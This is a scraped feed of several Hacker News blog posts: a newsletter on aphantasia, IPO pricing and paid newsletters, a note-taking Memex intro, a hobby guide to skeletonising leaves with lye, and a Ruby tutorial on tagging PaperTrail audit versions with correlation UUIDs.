            <p> 




  15 minute read
</p>
          
        </header>
      

      <section itemprop="text">
        
        <h2 id="takeaways">Takeaways</h2>

<ol>
  <li>The way you imagine things could be drastically different compared to most. There’s a simple test to find out how</li>
  <li>IPO pricing is difficult and success is hard to measure</li>
  <li>The direct relationship newsletters provide is game-changing, and I think the industry has huge room for growth</li>
</ol>

<p><em>This is a lightly edited version of <a href="https://avoidboringpeople.substack.com/" title="ABP">my monthly newsletter.</a> Sign up below</em></p>





<h2 id="how-well-can-you-visualise-something">How well can you visualise something?</h2>

<p>I just learnt that people visualise differently. Take this 10 second test:</p>

<p><img src="https://www.leonlinsx.com/assets/images/Aphantasia-test.png" alt="aphantasia"></p>

<p>I’m at a 3 to 4, whereas my cousin swears she’s at a 6 [1]. This goes a long way towards explaining my confusion whenever people were telling me to visualise things… I never could get the detail and clarity that everyone else seemed to be experiencing.</p>

<p><strong>For those people that score a 1, you likely have <a href="https://www.bbc.com/news/health-34039054" title="BBC">aphantasia</a>, a condition in which you’re unable to visualise mental images.</strong> <a href="https://www.reddit.com/r/slatestarcodex/comments/ab1fi4/is_aphantasia_real_exaggerated_or_a/" title="reddit">There’s skepticism over whether it’s real,</a> but the research seems convincing. The <a href="https://www.researchgate.net/publication/26792259_Loss_of_imagery_phenomenology_with_intact_visuo-spatial_task_performance_A_case_of_'blind_imagination'" title="older">initial paper</a> studied a person who initially had high visual memory and then lost it. Since he was able to talk about the distinct difference between his two states, I’m inclined to think this is a real phenomenon.</p>

<p>The research estimates 2% of the population having aphantasia, a small amount on the other extreme (hyperphantasia), and most people are in the middle with good visualisation ability.</p>

<p><a href="https://www.eugencpopa.ro/wp-content/uploads/Afantazia-.pdf" title="newer">The newer paper</a> has a questionnaire, more scientific than my simple test above, that you might want to check out for confirmation. I’m inferring that a score of ~30 or lower indicates aphantasia, and a higher score close to 80 indicates hyperphantasia [2].</p>

<p>Was an interesting day when I realised the way I think is completely different from how most people think! The strange thing is I could have gone my entire life without knowing, since it’s not something you’d discover on your own. Combined with the low occurrence rate, no wonder it’s taken so long for the scientific community to realise the existence of aphantasia.</p>

<p>What’s even stranger is that despite this literally life-changing knowledge, I don’t see how anything changes for me. <a href="https://www.scientificamerican.com/article/when-the-minds-eye-is-blind1/" title="learning">It doesn’t seem like you can learn to get better</a>, implying we’re all stuck at whatever we grew up with (or were born into?).</p>

<p>It also doesn’t seem like there have been many negative side effects thus far [3]. Knowing about this <em>has</em> made me less confused whenever I read or hear people talking about using my imagination though! Do let me know how you end up scoring!</p>

<h2 id="what-goes-on-behind-the-scenes-of-an-ipo">What goes on behind the scenes of an IPO?</h2>

<p>People hear about IPOs frequently, but usually are less aware of what happens behind the scenes. a16z recently <a href="https://a16z.com/2019/07/09/ipo-process-prices-behind-scenes-companies/" title="a16z">wrote a post</a> about the process, and I’m following up with some of my experience. As a reminder, none of this is investment advice. Ever.</p>

<blockquote>
  <p>[The S1] also serves as a marketing document positioning the company and its role in the marketplace, because the company has to avoid public promotion during the waiting period and follow strict rules around what they can and can’t say on behalf of the company. But behind closed doors during this time, the company does pre-pitch the company story and financials to potential investors.</p>
</blockquote>

<p>The “dumb” retail investor buys into an IPO because they’ve heard the stock will do well. The “smart” retail investor does diligence on the S1, comes up with their own financial model, and then decides whether they should participate.</p>

<p>Most retail investors assume there’s a level playing field, since the S1 should show all the important publicly available information and there shouldn’t be anything they’re missing out. <strong>This has never been true.</strong> Professional investors meet with management <em>all the time</em>, even pre-IPO. They don’t get material non-public information from these meetings, but I can assure you that nobody would waste their time doing management meetings if they weren’t helpful in some way.</p>

<blockquote>
  <p>With the order book in hand, the underwriters (banks) will allocate the shares to institutional investors. As part of this, they — and the company — want to minimize IPO allocations to investors that have a track record of selling the stock too quickly. They don’t always succeed in doing this, but that’s OK, since some selling helps make a “market”.</p>
</blockquote>

<p>There’s a capital markets team in the investment bank that works together with the company to decide how much stock to initially give out to the interested investors. Investors could ask for 10 shares at a $40 IPO price, but just 5 shares if the IPO price goes up to $45. Investors frequently ask for more shares than they think they’ll get, leading to an offering being “oversubscribed”. <strong>Nearly all offerings are oversubscribed,</strong> so if you read the news reporting that, just ignore it.</p>

<p>The intent during this bookbuilding process is to determine what price the company should IPO at, how much “real” demand there is, and who to give it to. I think regular IPOs usually allocate ~80% to institutional clients and ~20% other (<strong>Winnie</strong>, correct me if I’m mistaken here). Importantly, you and I don’t get to buy at the IPO price, but only at the price the stock starts trading at, which is usually higher.</p>

<blockquote>
  <p>People often assume an IPO means the entire company is going public — just because those companies are required to open their books and report their earnings on a quarterly basis — but actually no more than 10%-15% of the company is typically being sold. Such limited supply can have outsize impact in a short time frame, especially if there’s great demand.</p>
</blockquote>

<p>No company I know of has given 100% of the company away during an IPO. I suppose it’s possible, but that would be strange and probably a red flag [4]. The price is <a href="https://clutejournals.com/index.php/JBER/article/view/2412" title="IPO pop">usually set to have a first day “pop”</a> as a form of reward to the shareholders that supported the company and to also generate positive publicity and good vibes for the company employees.</p>

<p><a href="https://markets.businessinsider.com/news/stocks/slacks-direct-listing-bill-gurley-says-startups-call-morgan-stanley-2019-6-1028298641" title="Bill">Critics of the IPO process</a> think that this “pop” leaves money on the table, which is true, but <strong>most employees would (irrationally) prefer to have the stock IPO and keep going up</strong> rather than the reverse.</p>

<blockquote>
  <p>So how to gauge the success of IPO after the “pop”? Beyond Meat is trading today above $100. Does that mean the company left money on the table? If you do the math, the company raised about $240 million from the IPO. Had the stock been priced at the first-trade price ($46), however, it could have raised nearly double that amount — and well more if it had priced at the closing stock price. Then again, people might not have invested as much at that price.</p>
</blockquote>

<p>To further explain the <a href="http://www.underpricing.de/Downloads/Louhgran_Why%20Dont%20Issuers.pdf" title="research">“money on the table” issue</a>, BYND priced at $25, meaning institutional investors (not you and I) bought it at $25. When it started trading, someone (could be you or I now) put in an order at $46, and a holder of the share was willing to sell at $46, hence filling that order.</p>

<p>Some people would argue that if there was demand at $46, perhaps BYND should just have priced at $46 instead and gotten more cash from investors. Bill Gurley would argue to use a direct listing instead to match all demand and supply.</p>

<p><img src="https://www.leonlinsx.com/assets/images/Tilray-IPO.png" alt="Tilray"></p>

<p>I agree there’s money left on the table, but think about the alternative. Suppose BYND priced at $100 right from the start. That leaves nothing on the table, but now there’s a much higher chance the price declines after the IPO. And if it does decline, perhaps the price momentum keeps sinking it lower. We don’t know how much of the current trading price of BYND is due to momentum, and it seems to me it could have gone the other way as well. The general public still thinks of FB, GOOG, and Uber’s IPOs as failures due to the lack of a “pop”. You might argue who cares about the general public, but employee morale within the company is affected as well. My point here is there’s currently less incentive for companies to get pricing exactly right, and who knows what the right price is anyway [5]?</p>

<h2 id="why-are-newsletters-becoming-popular-and-where-is-this-trend-going">Why are newsletters becoming popular and where is this trend going?</h2>

<p>After I published last month’s newsletter, <a href="https://on.substack.com/p/the-future-of-substack" title="substack site">a16z led a $15mm funding round in Substack</a>, the platform I’m currently using to send this [6]. I’m going to talk about why a16z was interested in Substack and where I think this trend is headed.</p>

<p>From <a href="https://a16z.com/2019/07/16/substack/" title="a16z">a16z’s press release</a>:</p>

<blockquote>
  <p>Since then, the internet has opened up new opportunities for media producers. A writer, streamer, or podcaster can now reach an audience of millions. Powerful tools have been created to make it easier to self-publish any format of content. […] But most of this is driven by advertising-based business models from the 1800s — the technology may have changed, yet the economic model is largely the same.</p>
</blockquote>

<p>Stratechery has <a href="https://stratechery.com/2015/why-web-pages-suck/" title="ads">written before</a> on how ad networks facilitated the growth of advertising on the internet. The move from print media to digital media implied that the marginal cost to serve a consumer was zero. This reduction of the barrier to entry led to an influx of free content online, a trend which has still persisted but evolved into different forms [7].</p>

<p><strong>Because of the low cost to produce, high degree of substitutability, and high degree of fragmentation in the suppliers of content, content producers assumed that <a href="https://www.cnbc.com/2018/11/17/subscription-news-services-flourish-as-google-facebook-dominate-ads.html" title="cnbc">people wouldn’t pay for content</a>, and that selling ads was the better business model.</strong></p>

<p>As <a href="https://www.cnbc.com/2018/11/17/subscription-news-services-flourish-as-google-facebook-dominate-ads.html" title="cnbc">the CNBC article</a> notes though, a few factors have led to the rise of alternative, subscription based models instead. <strong>The dominance and effectiveness of google and facebook in digital advertising means that advertising on traditional content producers such as news sites has become less effective.</strong> As an advertiser, I’d rather spend more of my ad budget on where 60% of the internet is going to pass through and get a higher ROI on my ad spend.</p>

<p><img src="https://www.leonlinsx.com/assets/images/US-digital-advertising-share-2018.png" alt="ads"></p>

<p>The stranglehold on traffic by Google and Facebook also potentially result in a cost to acquire the marginal user, implying that the marginal cost to serve is no longer zero. For the normal media site, you’re now facing a …</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.leonlinsx.com/aphantasia/">https://www.leonlinsx.com/aphantasia/</a></em></p>]]>
            </description>
            <link>https://www.leonlinsx.com/aphantasia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532946</guid>
            <pubDate>Sun, 20 Sep 2020 09:47:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Memex – A proof of concept built in Electron and Chrome Extension]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24532788">thread link</a>) | @steve1820
<br/>
September 20, 2020 | https://www.steveliu.co/memex | <a href="https://web.archive.org/web/*/https://www.steveliu.co/memex">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-33de0799eab39cfadbe1"><div><p>I’ve never been a huge online note taker. From high school to university, I’ve always relied on pen and paper as my weapon of choice. At the time and even to some extent now, I’ve felt like this was a good enough solution to my problems.</p><p>I’ve always felt the simpler the solution the better. Why complicate things?</p><p>This changed however after working as a software engineer in industry. As I worked on a software product that derived its core functionality from machine learning, it seemed that I was constantly drowning in a sea of information.&nbsp;</p><p>It was a constant repetition of learning something, forgetting about it 5 months later and then having to recycle through my notes and reread the article/paper/blog.</p><p>My brain was a leaky bucket. Every time I poured something in, something else would leak out.</p><p>It was during those dark times of desperation that I stumbled upon the “niche” industry of Knowledge Management Systems (KMS) and as an extension, the Memex.</p><p> I was fascinated with all the innovation coming from up and coming open source projects and companies in this space. Software like Athens (https://github.com/athensresearch/athens), Roam (https://roamresearch.com/), Obsidian (https://obsidian.md/) all seemed so promising. </p><p>I was particularly inspired by reading karlicoss’s blog (https://beepb00p.xyz/promnesia.html). He outlines so many good and intuitive reasons why the current solutions are broken (although in this particular post he focuses on browser history).</p></div></div></div></div>]]>
            </description>
            <link>https://www.steveliu.co/memex</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532788</guid>
            <pubDate>Sun, 20 Sep 2020 08:55:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making Skeletonised Leaves]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24532709">thread link</a>) | @arbol
<br/>
September 20, 2020 | https://blog.lidskialf.net/2020/09/17/making-skeletonised-leaves/ | <a href="https://web.archive.org/web/*/https://blog.lidskialf.net/2020/09/17/making-skeletonised-leaves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1332">

	

	
			<figure>
				<img width="992" height="1331" src="https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=992" alt="" loading="lazy" srcset="https://adq454703481.files.wordpress.com/2020/09/dried.jpg 992w, https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=768 768w" sizes="(max-width: 992px) 100vw, 992px" data-attachment-id="1333" data-permalink="https://blog.lidskialf.net/dried/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/dried.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600352312&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;211&quot;,&quot;shutter_speed&quot;:&quot;0.010013&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="dried" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/dried.jpg?w=763">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<p>I decided I wanted to try making some skeletonised leaves. So I did some Googling and decided to try <a href="https://penguinbaybiology.org/make-clear-leaf-view-vein-structure/">this</a> approach.</p>



<p>We went out in the evening and gathered some leaves from the local  Shrubbery. Totally not suspicious 🙂</p>



<figure><img data-attachment-id="1343" data-permalink="https://blog.lidskialf.net/leaves/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600203574&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;909&quot;,&quot;shutter_speed&quot;:&quot;0.03&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="leaves" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=763" src="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=763" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=763 763w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/leaves.jpg 992w" sizes="(max-width: 763px) 100vw, 763px"></figure>



<p>I bought some Sodium Hydroxide and a cheap steel pot from ebay. Note: it must <strong>not</strong> be Aluminium as the Sodium Hydroxide will react with Aluminium!</p>



<figure><img data-attachment-id="1336" data-permalink="https://blog.lidskialf.net/ingredients/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg" data-orig-size="1331,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600381793&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;543&quot;,&quot;shutter_speed&quot;:&quot;0.03&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="ingredients" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=300" data-large-file="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=900" src="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=1024" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=1024 1024w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=150 150w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=300 300w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/ingredients.jpg 1331w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Although Sodium Hydroxide isn’t a deadly poison, you really don’t want it on your skin or in your eyes, so gloves/goggles are a necessity for safety. Hmm, I should really look into some sort of cheap lab coat as well to protect my clothes for this sorta stuff:</p>



<figure><img data-attachment-id="1339" data-permalink="https://blog.lidskialf.net/safety/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/safety.jpg" data-orig-size="1331,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600381856&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;634&quot;,&quot;shutter_speed&quot;:&quot;0.03&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="safety" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=300" data-large-file="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=900" src="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=1024" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=1024 1024w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=150 150w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=300 300w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/safety.jpg 1331w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I scaled up the proportions to 1L of (Edinburgh) tap water and 30G of Sodium Hydroxide powder. I put them in the pot, brought it to the boil and added the leaves. </p>



<p>For fun I also tested the pH of the solution with my new pH paper (also from Ebay/China). Its about a 14, so pretty alkaline!</p>



<figure><img data-attachment-id="1340" data-permalink="https://blog.lidskialf.net/phpaper/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600203853&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;108&quot;,&quot;shutter_speed&quot;:&quot;0.04001&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="phpaper" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=763" src="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=763" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=763 763w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/phpaper.jpg 992w" sizes="(max-width: 763px) 100vw, 763px"></figure>



<p>The instructions suggested boiling for about two hours, but it appears to depend on the leaves you choose. I checked on it every 20 minutes or so, and pulled leaves out as they became ready. </p>



<p>To process them, I had the following set up next to the pot:</p>



<ul><li>Tray 1: Plain tap water to wash off the Sodium Hydroxide.</li><li>Tray 2: Some “Ordinary Household Bleach” (aka Sodium Hypochlorite) to bleach any remaining colour out.</li><li>Tray 3: More plain tap water to wash off the bleach.</li><li>A sheet of alumunium foil to put the leaves on to dry out.</li></ul>



<p>After all of them were processed, I ended up with this:</p>



<figure><img data-attachment-id="1345" data-permalink="https://blog.lidskialf.net/drying/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/drying.jpg" data-orig-size="1331,998" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600212131&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;104&quot;,&quot;shutter_speed&quot;:&quot;0.010013&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="drying" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=300" data-large-file="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=900" src="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=1024" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=1024 1024w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=150 150w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=300 300w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/drying.jpg 1331w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The next morning I was able to unpeel the more robust leaves, yielding me these:</p>



<figure><img data-attachment-id="1346" data-permalink="https://blog.lidskialf.net/dried-1/" data-orig-file="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg" data-orig-size="992,1331" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 3&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1600352312&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.44&quot;,&quot;iso&quot;:&quot;211&quot;,&quot;shutter_speed&quot;:&quot;0.010013&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="dried-1" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=224" data-large-file="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=763" src="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=763" alt="" srcset="https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=763 763w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=112 112w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=224 224w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2020/09/dried-1.jpg 992w" sizes="(max-width: 763px) 100vw, 763px"></figure>



<p>Observations</p>



<ul><li>You need to use <em>robust</em> leaves from trees. I tried some nettle leaves, but they quickly turned to mush. Some of the tree leaves appeared to process fine, but turned out to be way too delicate to remove from the foil after drying: definitely depends on the species. There may be a better way to dry them, will think on it.</li><li>Only process one species of leaf at a time, otherwise you constantly have to check each one in the pot, which means you’re disturbing them more to check.</li><li>Make sure to check on the water level! I <em>almost</em> boiled it dry.</li><li>Its fiddly! During processing, you have to <em>carefully</em> unroll the leaves by hand while wearing gloves to get them flat prior to drying.</li><li>I tried processing a dried up Oak leaf since theoretically it should be closer to being skeletonised: it didn’t seem to work very well (you can see the unsuccessful result on the aluminium foil photo).</li></ul>



<p>What Next?</p>



<p>They’re definitely more robust than I expected, but they’re still quite delicate. I fancy trying dying them and embedding them into some transparent resin next.</p>




	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://blog.lidskialf.net/2020/09/17/making-skeletonised-leaves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532709</guid>
            <pubDate>Sun, 20 Sep 2020 08:35:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracking All Paper Trail Version from a Single Request with Correlation UUIDs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532550">thread link</a>) | @Azdaroth
<br/>
September 20, 2020 | https://karolgalanciak.com/blog/2020/09/20/tracking-all-paper-trail-version-from-a-single-request-with-correlation-uuids/ | <a href="https://web.archive.org/web/*/https://karolgalanciak.com/blog/2020/09/20/tracking-all-paper-trail-version-from-a-single-request-with-correlation-uuids/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>If you’ve ever had a need to implement an <strong>audit log</strong> to track all the changes that get persisted for all or at least some models in your application, there is a good chance that you’ve encountered <a href="https://github.com/paper-trail-gem/paper_trail">PaperTrail gem</a> that makes it trivial to <strong>track all the changes</strong> - it might be as easy as adding <code>has_paper_trail</code> to the desired models.</p>

<p>However, storing versions is just one thing. The other one is using them later, which sometimes might be far from obvious. For example, you see that some record was updated, but you don’t exactly know why. Maybe you have <code>whodunnit</code> stored, but it still doesn’t give you the entire picture as there might be multiple ways how a given record can be updated and you are trying to establish some <strong>causality</strong> between multiple actions as one update can lead to another one that can lead to yet another one. Not to mention that the persistence can be executed from the background jobs, which will mean that <code>whodunnit</code> will either be nil or be something else (if you, for example, decide to use the name of the job class for <code>paper_trail_user</code>). Merely using <code>created_at</code> won’t be that useful for sure as it’s not enough to group versions form the same context.</p>

<p>Fortunately, there is an easy solution to this problem, which is also quite simple to implement - it’s adding a <code>correlation UUID</code>.</p>

<h2 id="what-is-correlation-uuid">What Is Correlation UUID?</h2>

<p>Correlation UUID is a value in UUID format that is used for grouping <em>things</em> (events, logs…) that have the same origin (e.g., a specific action) that helps establish the causality (how exactly you ended up with something and what events lead to it). Thanks to that, you can easily figure out what happened during a specific request by assigning the same value of correlation UUID to all PaperTrailVersion records that got created. Furthermore, you can also track its side effects by reusing the same value in background jobs, e.g., in Sidekiq.</p>

<p>You might be wondering if this really has to be in UUID format, but the answer here is simple: no, it doesn’t need to be. For example, you can use ULID, which could even be a better choice as it has the benefit of being lexicographically sortable. It just happens that UUID is the most popular approach and it’s easy to generate.</p>

<h2 id="how-to-implement-correlation-uuid-for-papertrailversions">How to implement Correlation UUID for PaperTrailVersions</h2>

<p>The most straightforward approach would be assigning some global value unique per request (which implies the need for thread-safety) before saving the version. So what we need is an extra column (<code>correlation_uuid</code>) and something like <code>Thread.current</code> store but with values erased after each request. Fortunately, there is a gem that does exactly that: <a href="https://github.com/steveklabnik/request_store">request_store</a>.</p>

<p>Using a global is quite ugly, but it allows us to implement the desired feature in a simple way, and it doesn’t necessarily make the design worse as <code>paper_trail</code> already uses a similar global for storing, e.g. <code>whodunnit</code> value.</p>

<p>Here is how an example UUID generator could look like:</p>

<div><div><pre><code><span>class</span> <span>RequestCorrelationUuidGenerator</span>
  <span>def</span> <span>self</span><span>.</span><span>uuid</span>
    <span>store</span><span>[</span><span>:correlation_uuid</span><span>]</span> <span>||=</span> <span>SecureRandom</span><span>.</span><span>uuid</span>
  <span>end</span>

  <span>def</span> <span>self</span><span>.</span><span>uuid</span><span>=</span><span>(</span><span>value</span><span>)</span>
    <span>store</span><span>[</span><span>:correlation_uuid</span><span>]</span> <span>=</span> <span>value</span>
  <span>end</span>

  <span>def</span> <span>self</span><span>.</span><span>store</span>
    <span>RequestStore</span><span>.</span><span>store</span><span>[</span><span>:paper_trail</span><span>]</span> <span>||=</span> <span>{}</span>
  <span>end</span>
  <span>private_class_method</span> <span>:store</span>
<span>end</span>
</code></pre></div></div>

<p><code>paper_trail</code> stores global data in <code>RequestStore.store[:paper_trail]</code> so it’s a reasonable idea to reuse it for storing our correlation UUID.</p>

<p>Now, that we have a generator, let’s add a callback to the to PaperTrailVersion model:</p>

<div><div><pre><code><span>class</span> <span>Version</span> <span>&lt;</span> <span>PaperTrail</span><span>::</span><span>Version</span>
  <span>before_create</span> <span>:ensure_correlation_uuid_assigned</span>

  <span>private</span>

  <span>def</span> <span>ensure_correlation_uuid_assigned</span>
    <span>self</span><span>.</span><span>correlation_uuid</span> <span>=</span> <span>RequestCorrelationUuidGenerator</span><span>.</span><span>uuid</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>And that’s it! That will be enough to group version coming from a single request. Now, if you find something suspicious, you can take the correlation UUID, find other versions with that value, order them by <code>created_at,</code> and the debugging should be way more pleasant. Just don’t forget to add the index ;).</p>

<h2 id="correlation-uuid-for-further-side-effects---how-to-use-it-in-background-jobs">Correlation UUID for further side-effects - how to use it in background jobs?</h2>

<p>As I mentioned earlier, it might be quite valuable to pass the correlation UUID further to the background jobs, so that we can understand every step of the saga that originated from a specific action.</p>

<p>Of course, background jobs are not requests, but fortunately, it’s not that difficult to reuse our <code>RequestCorrelationUuidGenerator</code> inside jobs.</p>

<p>Since Sidekiq is arguably the most popular solution for background jobs processing in Rails apps, I will show an example solution for Sidekiq. However, the idea itself should be possible to replicate for every other processor.</p>

<p>As a prerequisite to make it work with Sidekiq, we will need to introduce <a href="https://github.com/madebylotus/request_store-sidekiq">request_store-sidekiq</a> gem. Since <code>request_store</code> clears the storage after each request, so that the values don’t stick between them, we need something that will do the same thing, but after the job is processed. And that’s exactly what this gem does.</p>

<p>The first problem that we need to solve is to make the correlation UUID somehow available in the job. One way to do this would be to make it an argument of the job, but that sounds painful to deal with. Ideally, we would have something that doesn’t force us to change the signature of the <code>perform</code> method, and that injects the value without us doing it directly in any place. The second problem to solve would be to extract somehow the value of correlation UUID before the job gets executed and set that UUID for the global context (for a current Thread) using <code>RequestCorrelationUuidGenerator.uuid=</code> attribute writer.</p>

